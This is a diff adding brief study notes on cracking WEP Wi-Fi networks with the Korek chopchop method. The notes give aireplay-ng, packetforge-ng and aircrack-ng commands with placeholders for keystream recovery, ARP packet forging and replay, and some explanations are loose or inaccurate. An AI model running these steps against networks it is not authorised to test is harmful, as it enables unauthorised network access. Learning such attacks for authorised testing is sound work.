@@ -1,0 +1,9 @@
+Packet Injection - Korek Chop Chop Method
+
+
+aireplay-ng --chopchop -b (BSSID/ROUTER) -h (OUR MAC ADDRESS) wlan0mon - Captures a packet to find out its key stream, cracks it, may take some time
+packetforge-ng -0 -a (BSSID/ROUTER) -h (OUR MAC ADDRESS) -k 255.255.255.255 -l 255.255.255.255 -y FILE_NAME.xor -w (NAME) -0 creates a ARP packet for us, 255 stuff has to be there, file name was previously generated with --chopchop, -w name the packet file
+aireplay-ng -2 -r (PACKET NAME)  - -2 is a reply attack, -r is to choose the packet created earlier, 
+
+aircrack-ng chopchop- - Lists all chopchop files
+aircrack-ng FILENAME.cap - Opens the specified chopchop file
